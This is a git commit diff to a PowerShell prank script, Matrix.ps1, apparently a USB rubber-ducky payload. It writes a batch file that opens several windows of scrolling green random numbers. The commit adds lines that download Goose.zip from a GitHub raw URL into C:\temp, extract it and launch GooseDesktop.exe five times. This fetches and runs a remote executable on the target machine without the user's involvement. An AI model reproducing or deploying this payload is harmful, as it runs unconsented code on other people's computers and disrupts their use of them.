01fbb85f8b715d9a52811aa98f65733d3af28bd1
kirikatu <159580335+kirikatu@users.noreply.github.com>
2024-02-11 21:14:33 +0100

    Update Matrix.ps1

--- Matrix.ps1
+++ Matrix.ps1
@@ -5,14 +5,25 @@ color 2
 echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
 goto top
 "@
+#popup Matrix
 mkdir C:\temp
 New-Item c:\temp\matrix.bat
 $batchFilePath = "c:\temp\matrix.bat"
 Set-Content -Path $batchFilePath -Value $batchContent
 
-$n=10
+$n=5
 while($n -ne 0){
 Start-Process -FilePath $batchFilePath
 $n= $n-1
 }
+#Goose tricks
+$outfile="C:\temp"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/kirikatu/rubberducky/main/Goose.zip -OutFile $outfile\Goose.zip
 
+Expand-Archive -Path $outfile\Goose.zip -DestinationPath $outfile\Goose
+
+$n=5  
+while($n -ne 0){
+Start-Process -FilePath C:\temp\Goose\GooseDesktop.exe
+$n= $n-1
+}
